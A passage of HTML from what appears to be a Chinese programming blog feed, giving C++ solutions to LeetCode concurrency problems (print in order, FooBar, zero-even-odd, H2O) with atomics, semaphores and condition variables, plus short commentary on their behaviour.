class="line">atomic&lt;<span class="type">int</span>&gt; flag&#123;<span class="number">0</span>&#125;;</span><br><span class="line">atomic&lt;<span class="type">bool</span>&gt; if_exit&#123;<span class="literal">false</span>&#125;;</span><br><span class="line">thread smokers[MAX_SMOKERS];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">judge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   random_device rd;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_SMOKE_CNT; ++i) &#123;</span><br><span class="line">      <span class="keyword">while</span> (flag != <span class="number">0</span>) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">      <span class="type">int</span> new_smoker = (<span class="type">int</span>) ((<span class="built_in">rd</span>() % <span class="number">3</span>) + <span class="number">1</span>);</span><br><span class="line">      flag = new_smoker;</span><br><span class="line">   &#125;</span><br><span class="line">   if_exit = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">smoke</span><span class="params">(<span class="type">int</span> id)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> (flag != id) &#123;</span><br><span class="line">         <span class="keyword">if</span> (if_exit) <span class="keyword">return</span>;</span><br><span class="line">         <span class="keyword">else</span> this_thread::<span class="built_in">yield</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      cout &lt;&lt; <span class="string">&quot;smoker &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot; is smoking...&quot;</span> &lt;&lt; endl;</span><br><span class="line">      this_thread::<span class="built_in">sleep_for</span>(chrono::<span class="built_in">milliseconds</span>(<span class="number">500</span>));</span><br><span class="line">      flag = <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_SMOKERS; ++i) smokers[i] = <span class="built_in">thread</span>(smoke, i + <span class="number">1</span>);</span><br><span class="line">   thread judger = <span class="built_in">thread</span>(judge);</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;smoker: smokers) &#123; smoker.<span class="built_in">join</span>(); &#125;</span><br><span class="line">   judger.<span class="built_in">join</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优雅地使用了C++11中的随机数生成器。</p>]]></content>
      
      
      <categories>
          
          <category> concurrency </category>
          
      </categories>
      
      
        <tags>
            
            <tag> concurrency </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode多线程练习</title>
      <link href="/2022/01/04/LeetCode-Concurrency/"/>
      <url>/2022/01/04/LeetCode-Concurrency/</url>
      
        <content type="html"><![CDATA[<p>分别⽤原⼦操作，semaphore，condition variable三种⽅式实现<a href="https://leetcode-cn.com/problemset/concurrency/">题库</a>中的题目。</p><h2 id="1114-按序打印"><a href="#1114-按序打印" class="headerlink" title="1114. 按序打印"></a><a href="https://leetcode-cn.com/problems/print-in-order">1114. 按序打印</a></h2><h3 id="atomic-operation"><a href="#atomic-operation" class="headerlink" title="atomic operation"></a>atomic operation</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    atomic_bool a = <span class="literal">false</span>, b = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Foo</span>() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">first</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFirst)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// printFirst() outputs &quot;first&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printFirst</span>();</span><br><span class="line">        a = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">second</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printSecond)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(!a) this_thread::<span class="built_in">sleep_for</span>(chrono::<span class="built_in">milliseconds</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">// printSecond() outputs &quot;second&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printSecond</span>();</span><br><span class="line">        b = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">third</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printThird)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(!b) this_thread::<span class="built_in">sleep_for</span>(chrono::<span class="built_in">milliseconds</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">// printThird() outputs &quot;third&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printThird</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>初识原子操作。</p><h3 id="semaphore"><a href="#semaphore" class="headerlink" title="semaphore"></a>semaphore</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">sem_t</span> sem_1, sem_2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Foo</span>() &#123;</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;sem_1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;sem_2, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">first</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFirst)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// printFirst() outputs &quot;first&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printFirst</span>();</span><br><span class="line">        <span class="built_in">sem_post</span>(&amp;sem_1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">second</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printSecond)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sem_wait</span>(&amp;sem_1);</span><br><span class="line">        <span class="comment">// printSecond() outputs &quot;second&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printSecond</span>();</span><br><span class="line">        <span class="built_in">sem_post</span>(&amp;sem_2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">third</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printThird)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sem_wait</span>(&amp;sem_2);</span><br><span class="line">        <span class="comment">// printThird() outputs &quot;third&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printThird</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="condition-variable"><a href="#condition-variable" class="headerlink" title="condition variable"></a>condition variable</h3><p>条件变量（Condition Variable）的一般用法是：线程 A 等待某个条件并挂起，直到线程 B 设置了这个条件，并通知条件变量，然后线程 A 被唤醒。这里等待的线程可以是多个，通知线程可以选择一次通知一个（<code>notify_one</code>）或一次通知所有（<code>notify_all</code>）。</p><p>加锁主要有两方面的作用：</p><ol><li>保护pred资源，避免多线程同时读写该资源</li><li>保证等待线程中pred的读操作和wait操作的原子性</li></ol><p><code>cv.wait(lock, [] &#123; return ready;&#125;);</code> 相当于：<code>while (!ready) &#123; cv.wait(lock);&#125;</code>。</p><p>当<code>ready==false</code>的时候，<code>while</code>语句执行到<code>wait</code>这里，然后就堵塞到这行，等到通知信号来唤醒它，同时解锁互斥量，不影响其他线程获取锁。当 <code>cv.notify_all();</code> 时，通知所有线程，等待唤醒的线程收到了信号就被唤醒开始干活，首先就是不断的尝试重新获取并加锁互斥量。若获取不到锁，就卡在这里，反复尝试加锁，若获取到了锁才往下执行。</p><p>没有<code>locker.unlock();</code>，因为局部变量在函数体中执行完后自动释放。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line">    condition_variable cv;</span><br><span class="line">    mutex mtx;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Foo</span>() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">first</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFirst)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printFirst</span>();</span><br><span class="line">        flag = <span class="number">1</span>;</span><br><span class="line">        cv.<span class="built_in">notify_all</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">second</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printSecond)</span> </span>&#123;</span><br><span class="line">        unique_lock&lt;mutex&gt;<span class="built_in">locker</span>(mtx);</span><br><span class="line">        cv.<span class="built_in">wait</span>(locker,[<span class="keyword">this</span>]&#123;<span class="keyword">return</span> flag == <span class="number">1</span>;&#125;);</span><br><span class="line">        <span class="built_in">printSecond</span>();</span><br><span class="line">        flag = <span class="number">2</span>;</span><br><span class="line">        cv.<span class="built_in">notify_one</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">third</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printThird)</span> </span>&#123;</span><br><span class="line">        unique_lock&lt;mutex&gt;<span class="built_in">locker</span>(mtx);</span><br><span class="line">        cv.<span class="built_in">wait</span>(locker,[<span class="keyword">this</span>]&#123;<span class="keyword">return</span> flag == <span class="number">2</span>;&#125;);</span><br><span class="line">        <span class="built_in">printThird</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1115-交替打印-FooBar"><a href="#1115-交替打印-FooBar" class="headerlink" title="1115. 交替打印 FooBar"></a><a href="https://leetcode-cn.com/problems/print-foobar-alternately">1115. 交替打印 FooBar</a></h2><h3 id="atomic-operation-1"><a href="#atomic-operation-1" class="headerlink" title="atomic operation"></a>atomic operation</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FooBar</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    atomic_bool foo_done = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">FooBar</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFoo)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span>(foo_done) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">        <span class="comment">// printFoo() outputs &quot;foo&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printFoo</span>();</span><br><span class="line">            foo_done = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">bar</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printBar)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span>(!foo_done) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">        <span class="comment">// printBar() outputs &quot;bar&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printBar</span>();</span><br><span class="line">            foo_done = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里阻塞进程用了<code>yield()</code>，而不是像1114题一样使用<code>sleep_for()</code>。使用<code>sleep_for()</code>始终超时，使用<code>yield()</code>的效率却和使用信号量的效率相当。而在1114题中，使用<code>sleep_for()</code>的耗时仅为使用<code>yield()</code>的一半。</p><h3 id="semaphore-1"><a href="#semaphore-1" class="headerlink" title="semaphore"></a>semaphore</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FooBar</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">sem_t</span> foo_done, bar_done;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">FooBar</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;foo_done, <span class="number">0</span> , <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;bar_done, <span class="number">0</span> , <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFoo)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="built_in">sem_wait</span>(&amp;bar_done);</span><br><span class="line">        <span class="comment">// printFoo() outputs &quot;foo&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printFoo</span>();</span><br><span class="line">            <span class="built_in">sem_post</span>(&amp;foo_done);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">bar</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printBar)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="built_in">sem_wait</span>(&amp;foo_done);</span><br><span class="line">        <span class="comment">// printBar() outputs &quot;bar&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printBar</span>();</span><br><span class="line">            <span class="built_in">sem_post</span>(&amp;bar_done);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="condition-variable-1"><a href="#condition-variable-1" class="headerlink" title="condition variable"></a>condition variable</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FooBar</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    mutex mtx;</span><br><span class="line">    condition_variable cv;</span><br><span class="line">    <span class="type">bool</span> foo_done = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">FooBar</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFoo)</span> </span>&#123;</span><br><span class="line">        unique_lock&lt;mutex&gt;<span class="built_in">locker</span>(mtx);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            cv.<span class="built_in">wait</span>(locker, [<span class="keyword">this</span>] &#123;<span class="keyword">return</span> !foo_done;&#125;);</span><br><span class="line">        <span class="comment">// printFoo() outputs &quot;foo&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printFoo</span>();</span><br><span class="line">            foo_done = <span class="literal">true</span>;</span><br><span class="line">            cv.<span class="built_in">notify_one</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">bar</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printBar)</span> </span>&#123;</span><br><span class="line">        unique_lock&lt;mutex&gt;<span class="built_in">locker</span>(mtx);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            cv.<span class="built_in">wait</span>(locker, [<span class="keyword">this</span>] &#123;<span class="keyword">return</span> foo_done;&#125;);</span><br><span class="line">        <span class="comment">// printBar() outputs &quot;bar&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printBar</span>();</span><br><span class="line">            foo_done = <span class="literal">false</span>;</span><br><span class="line">            cv.<span class="built_in">notify_one</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1116-打印零与奇偶数"><a href="#1116-打印零与奇偶数" class="headerlink" title="1116. 打印零与奇偶数"></a><a href="https://leetcode-cn.com/problems/print-zero-even-odd">1116. 打印零与奇偶数</a></h2><h3 id="atomic-operation-2"><a href="#atomic-operation-2" class="headerlink" title="atomic operation"></a>atomic operation</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ZeroEvenOdd</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    atomic_int flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">ZeroEvenOdd</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printNumber(x) outputs &quot;x&quot;, where x is an integer.</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">zero</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(flag) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">            <span class="built_in">printNumber</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                flag = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">even</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i += <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(flag != <span class="number">2</span>) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">            <span class="built_in">printNumber</span>(i);</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">odd</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i += <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(flag != <span class="number">1</span>) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">            <span class="built_in">printNumber</span>(i);</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>很快。</p><h3 id="semaphore-2"><a href="#semaphore-2" class="headerlink" title="semaphore"></a>semaphore</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ZeroEvenOdd</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">sem_t</span> s0, s1, s2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">ZeroEvenOdd</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;s0, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;s1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;s2, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printNumber(x) outputs &quot;x&quot;, where x is an integer.</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">zero</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            <span class="built_in">sem_wait</span>(&amp;s0);</span><br><span class="line">            <span class="built_in">printNumber</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">sem_post</span>(&amp;s1);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sem_post</span>(&amp;s2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">even</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i += <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">sem_wait</span>(&amp;s2);</span><br><span class="line">            <span class="built_in">printNumber</span>(i);</span><br><span class="line">            <span class="built_in">sem_post</span>(&amp;s0);</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">odd</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i += <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">sem_wait</span>(&amp;s1);</span><br><span class="line">            <span class="built_in">printNumber</span>(i);</span><br><span class="line">            <span class="built_in">sem_post</span>(&amp;s0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="condition-variable-2"><a href="#condition-variable-2" class="headerlink" title="condition variable"></a>condition variable</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ZeroEvenOdd</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    mutex mtx;</span><br><span class="line">    condition_variable cv;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">ZeroEvenOdd</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printNumber(x) outputs &quot;x&quot;, where x is an integer.</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">zero</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span>&#123;</span><br><span class="line">        <span class="function">unique_lock&lt;mutex&gt; <span class="title">locker</span><span class="params">(mtx)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            cv.<span class="built_in">wait</span>(locker, [<span class="keyword">this</span>] &#123;<span class="keyword">return</span> flag == <span class="number">0</span>;&#125;);</span><br><span class="line">            <span class="built_in">printNumber</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span>)&#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                flag = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cv.<span class="built_in">notify_all</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">even</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span>&#123;</span><br><span class="line">        <span class="function">unique_lock&lt;mutex&gt; <span class="title">locker</span><span class="params">(mtx)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i+=<span class="number">2</span>)&#123;</span><br><span class="line">            cv.<span class="built_in">wait</span>(locker, [<span class="keyword">this</span>] &#123;<span class="keyword">return</span> flag == <span class="number">2</span>;&#125;);</span><br><span class="line">            <span class="built_in">printNumber</span>(i);</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">            cv.<span class="built_in">notify_all</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">odd</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span>&#123;</span><br><span class="line">        <span class="function">unique_lock&lt;mutex&gt; <span class="title">locker</span><span class="params">(mtx)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i+=<span class="number">2</span>)&#123;</span><br><span class="line">            cv.<span class="built_in">wait</span>(locker, [<span class="keyword">this</span>] &#123;<span class="keyword">return</span> flag == <span class="number">1</span>;&#125;);</span><br><span class="line">            <span class="built_in">printNumber</span>(i);</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">            cv.<span class="built_in">notify_all</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1117-H2O-生成"><a href="#1117-H2O-生成" class="headerlink" title="1117. H2O 生成"></a><a href="https://leetcode-cn.com/problems/building-h2o">1117. H2O 生成</a></h2><h3 id="atomic-operation-3"><a href="#atomic-operation-3" class="headerlink" title="atomic operation"></a>atomic operation</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">H2O</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    atomic_int H_cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">H2O</span>() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">hydrogen</span><span class="params">(function&lt;<span class="type">void</span>()&gt; releaseHydrogen)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(H_cnt == <span class="number">2</span>) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">        <span class="built_in">releaseHydrogen</span>();</span><br><span class="line">        H_cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">oxygen</span><span class="params">(function&lt;<span class="type">void</span>()&gt; releaseOxygen)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(H_cnt != <span class="number">2</span>) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">        <span class="built_in">releaseOxygen</span>();</span><br><span class="line">        H_cnt = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span 